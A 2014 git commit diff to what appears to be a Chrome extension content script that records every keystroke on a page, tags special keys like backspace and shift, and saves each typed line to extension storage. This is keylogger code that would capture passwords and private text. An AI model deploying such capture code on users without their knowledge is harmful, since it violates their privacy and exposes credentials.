327a06156e209e923933e70eca5c0ab087bdd4ee
Hebron George <hebrontgeorge@gmail.com>
2014-06-12 12:04:39 -0400

    Uses keywords for special characters now (e.g. backspace, tab, shift, etc) instead of illegible boxes.

--- myscript.js
+++ myscript.js
@@ -1,10 +1,23 @@
 var input = '';
+var items = {}, i = 0;
 $(document).keydown(function(e){ 
+  console.log(e.which);
   if (e.which == 13){
-    alert(input);
+    console.log(input);
+    items[i++] = input;
+    chrome.storage.local.set(items);
+    chrome.storage.local.get(null, function(result){console.log(result);});
     input = '';
   } else if (e.which === 9){
-    input += '|';
+    input += '<tab>';
+  } else if (e.which === 8){
+    input += '<backspace>';
+  } else if (e.which === 16){
+    input += '<shift>';
+  } else if (e.which === 17){
+    input += '<ctrl>';
+  } else if (e.which === 20){
+    input += '<capslock>';
   } else {
     input += String.fromCharCode(e.which);
   }
